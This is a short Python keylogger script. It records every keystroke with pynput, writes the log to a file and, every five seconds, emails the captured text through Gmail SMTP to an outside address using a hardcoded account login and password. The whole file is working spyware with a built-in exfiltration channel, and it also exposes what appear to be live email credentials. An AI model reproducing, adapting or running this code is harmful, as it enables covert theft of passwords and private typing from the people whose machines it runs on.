#!/usr/bin/env python3
import pynput.keyboard
import threading
import subprocess
import smtplib
#command = "%SystemRoot%\Sysnative\msg.exe * Keylogger started"
#subprocess.Popen(command, shell=True)
log=""
def keypress(key):
	global log
	try:
		log=log+str(key.char)
	except AttributeError:
		if key == key.space:
			log=log + " "
		else:
			log = log + " " + str(key) + " "
def report():
	global log
	with open('logged.txt', 'w') as logged:
		logged.write(log)
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login("bfanibe@gmail.com", "rpwutvecsadwuzhx")
	server.sendmail("bfanibe@gmail.com", "soc@fnz.com", log)
	server.quit()
	log = ""
	timer = threading.Timer(5, report)
	timer.start()

listener=pynput.keyboard.Listener(on_press=keypress)
with listener:
	report()
	listener.join()
Keylogger
